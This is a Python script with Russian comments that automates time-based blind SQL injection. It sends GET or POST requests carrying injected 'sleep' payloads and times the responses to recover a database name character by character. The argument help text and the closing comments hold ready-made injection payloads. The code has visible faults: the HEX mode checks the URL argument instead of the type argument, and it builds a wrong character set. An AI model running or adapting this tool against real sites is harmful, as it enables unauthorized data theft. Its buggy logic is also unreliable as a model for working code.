from timeit import default_timer as timer  # библиотека измерения времени
import requests  # библиотека HTTP запросов
import argparse

parser = argparse.ArgumentParser(description='blind sql injection', usage='Script options')
parser.add_argument('-get', help='HTTP GET method. Example: python3 blind_sql.py -get -u "http://example.com:1337?id=1 \
and (case when ASCII(substring((SELECT database() limit 0,1), {POSITION}, 1))={SYMBOL} THEN sleep(3) END) -- -" ',
                    action="store_true")
parser.add_argument('-post',
                    help='HTTP POST method. Example: python3 blind_sql.py -post -u "http://example.com:1337" -d "name=value\' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #" ',
                    action="store_true")
parser.add_argument('-u', '--URL', type=str, help='Enter URL Example: --URL "http://192.168.0.1/"', )
parser.add_argument('-d', '--Data' , action='append', nargs='+',
                    help='Data string to be sent through POST in format kay=value (e.g. -d "id=1337" "name=value\' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #" )')
parser.add_argument('-t', '--Type', type=str, help='Type strings Example: -t HEX', )
parser.add_argument('-H', '--Header', action='append', nargs='+',
                    help='Headers for a POST request (e.g. "-H "Content-Type: application/json" -H "Authorization: Bearer token {SYMBOL}" ")')
args = parser.parse_args()


def greetings():
    """Функция отображает приветствие пользователя"""
    print('''BLIND SQL INJECTION''')


def blind_sql(length_result, delay_time):
    i = 1  # начальное значение инкремента
    print('Print result:')

    while (i <= length_result):  # Цикл while будет выполняться пока не дойдем до конца возможной длинны
        # print('i:', i)
        for char in dictionary:  # Цикл for по нашему словарю dictionary
            start_time = timer()  # Начальное время
            if args.get == True:
                headers = {}
                if args.Header:  # если есть headers, тогда подготовь их для отправки
                    for header_list in args.Header:
                        for header in header_list:
                            key, value = header.split(':')
                            headers[key.strip()] = value.strip().format(POSITION=i, SYMBOL=char)

                res = requests.get(args.URL.format(POSITION=i, SYMBOL=char), headers=headers)
            elif args.post == True:
                headers = {}
                if args.Header:  # если есть headers, тогда подготовь их для отправки
                    for header_list in args.Header:
                        for header in header_list:
                            key, value = header.split(':')
                            headers[key.strip()] = value.strip().format(POSITION=i, SYMBOL=char)

                post_data = {}
                if args.Data:
                    for data_list in args.Data:
                        for data in data_list:
                            key, value = data.split('=', 1)
                            post_data[key] = value.format(POSITION=i, SYMBOL=char)

                res = requests.post(args.URL, headers=headers, data=post_data)
                # функция format подставляет значения из i и char в запрос вместо {}
            end_time = timer()  # Конечное время
            time = end_time - start_time  # Затраченное время
            print(chr(char),
                  time)  # просмотр всех результатов для определения подходящего времени переменной time для вывода релевантных результатов
            if time > delay_time:  # вывод только релевантных результатов
                # print(chr(char), end='\n', flush=True)
                print(chr(char), end='', flush=True)
                break
        i += 1  # Двигаемся далее


if __name__ == "__main__":
    greetings()
    length_result = int(input('Input length: '))  # Возможная длинна строки
    delay_time = 2 # если ответ приходит дольше - значит букву угадали

    if args.URL.upper() == 'HEX':
        dictionary = list(range(0, 10)) + list(range(ord('A'), ord('F') + 1))
    else:
        dictionary = list(range(48, 58)) + list(range(95, 126))  # Список кодов ASCII возможных симолов
    print(dictionary)

    if not args.get and not args.post:
        parser.error('Argument not specified. Use -get or -post')

    blind_sql(length_result, delay_time)

# python3 main.py -post -u "http://192.168.0.1/" -type HEX -H "Content-Type: application/json" -H "Authorization: Bearer token"

# парсим -d
# python3 main.py -post -u "http://192.168.0.1/" -type HEX -d "id=1337" -d "name=value' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #"


# python3 main.py -post -u "http://192.168.0.1/" --Type HEX -d "id=1337" --Data "name=value" -H "Content-Type: application/json" -H "Authorization: Bearer token {SYMBOL}"